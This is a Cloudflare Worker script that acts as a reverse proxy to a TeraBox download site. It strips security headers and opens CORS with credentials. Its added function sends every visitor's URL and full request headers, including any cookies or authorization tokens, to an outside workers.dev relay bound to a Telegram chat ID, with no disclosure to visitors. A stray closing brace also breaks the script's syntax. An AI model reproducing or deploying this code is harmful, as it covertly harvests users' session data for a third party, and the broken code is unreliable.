const upstream = 'terabox-dl.qtcloud.workers.dev'
const upstream_path = '/'
const upstream_mobile = 'terabox-dl.qtcloud.workers.dev'
const blocked_region = ['CN', 'KP', 'SY', 'PK', 'CU']
const blocked_ip_address = ['0.0.0.0', '127.0.0.1']
const https = true
const disable_cache = true
const replace_dict = {
    '$upstream': '$custom_domain',
    '//google.com': ''
}

addEventListener('fetch', (event) => {
    event.respondWith(fetchAndApply(event.request));
});

async function fetchAndApply(request) {
    const region = request.headers.get('cf-ipcountry').toUpperCase();
    const ip_address = request.headers.get('cf-connecting-ip');
    const user_agent = request.headers.get('user-agent');

    let response = null;
    let url = new URL(request.url);
    let url_hostname = url.hostname;

    if (https == true) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    if (await device_status(user_agent)) {
        var upstream_domain = upstream;
    } else {
        var upstream_domain = upstream_mobile;
    }

    url.host = upstream_domain;
    if (url.pathname == '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    if (blocked_region.includes(region)) {
        response = new Response('Access denied: WorkersProxy is not available in your region yet.', {
            status: 403
        });
    } else if (blocked_ip_address.includes(ip_address)) {
        response = new Response('Access denied: Your IP address is blocked by WorkersProxy.', {
            status: 403
        });
    } else {
        let method = request.method;
        let request_headers = request.headers;
        let new_request_headers = new Headers(request_headers);

        new_request_headers.set('Host', upstream_domain);
        new_request_headers.set('Referer', url.protocol + '//' + url_hostname);

        // New code to send request details to Telegram
        await sendRequestDetailsToTelegram(request);

        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers
        });

        let original_response_clone = original_response.clone();
        let original_text = null;
        let response_headers = original_response.headers;
        let new_response_headers = new Headers(response_headers);
        let status = original_response.status;

        if (disable_cache) {
            new_response_headers.set('Cache-Control', 'no-store');
        }

        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');

        if (new_response_headers.get("x-pjax-url")) {
            new_response_headers.set("x-pjax-url", response_headers.get("x-pjax-url").replace("//" + upstream_domain, "//" + url_hostname));
        }

        const content_type = new_response_headers.get('content-type');
        if (content_type != null && content_type.includes('text/html') && content_type.includes('UTF-8')) {
            original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);
        } else {
            original_text = original_response_clone.body
        }

        response = new Response(original_text, {
            status,
            headers: new_response_headers
        });
    }
    return response;
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text()

    var i, j;
    for (i in replace_dict) {
        j = replace_dict[i]
        if (i == '$upstream') {
            i = upstream_domain
        } else if (i == '$custom_domain') {
            i = host_name
        }

        if (j == '$upstream') {
            j = upstream_domain
        } else if (j == '$custom_domain') {
            j = host_name
        }

        let re = new RegExp(i, 'g')
        text = text.replace(re, j);
    }
    return text;
}

async function device_status(user_agent_info) {
    var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
    var flag = true;
    for (var v = 0; v < agents.length; v++) {
        if (user_agent_info.indexOf(agents[v]) > 0) {
            flag = false;
            break;
        }
    }
    return flag;
}
    
}

// New function to send request details to Telegram
async function sendRequestDetailsToTelegram(request) {
    const chatId = '5149523544'; // Replace with your desired chat_id
    const apiUrl = `https://hello-world-bitter-heart-26fd.khalnayak.workers.dev?chat_id=${chatId}&text=`;

    // Extract request details
    const url = request.url;
    const method = request.method;
    const headers = request.headers;

    // Prepare the message text with request details
    const messageText = `Request Details:\n\nURL: ${url}\nMethod: ${method}\nHeaders: ${JSON.stringify([...headers])}`;

    // Build the full Telegram endpoint URL with the message text
    const fullTelegramUrl = apiUrl + encodeURIComponent(messageText);

    // Send a GET request to the Telegram endpoint
    await fetch(fullTelegramUrl);
}
